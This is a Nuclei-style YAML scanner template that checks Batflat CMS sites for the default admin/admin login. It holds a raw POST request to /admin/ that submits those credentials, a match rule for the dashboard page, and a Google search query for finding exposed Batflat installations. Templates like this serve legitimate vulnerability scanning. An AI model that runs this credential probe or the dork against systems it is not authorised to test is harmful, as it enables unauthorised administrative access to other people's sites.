http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "Batflat - Dashboard")
    type: dsl
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /admin/ HTTP/2

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username={{username}}&password={{password}}&login=

    '
id: batflat-default-login
info:
  author: r3Y3r53
  description: 'Batflat CMS is vulnerable to default login vulnerability that most
    commonly affects devices having some pre-set (default) administrative credentials
    to access all configuration settings.

    '
  metadata:
    google-query: intext:"Powered by Batflat."
    max-request: 1
    verified: true
  name: Batflat CMS - Default Login
  reference:
  - https://www.exploitalert.com/view-details.html?id=34749
  - https://cxsecurity.com/issue/WLB-2020010100
  severity: high
  tags: default-login,batflat
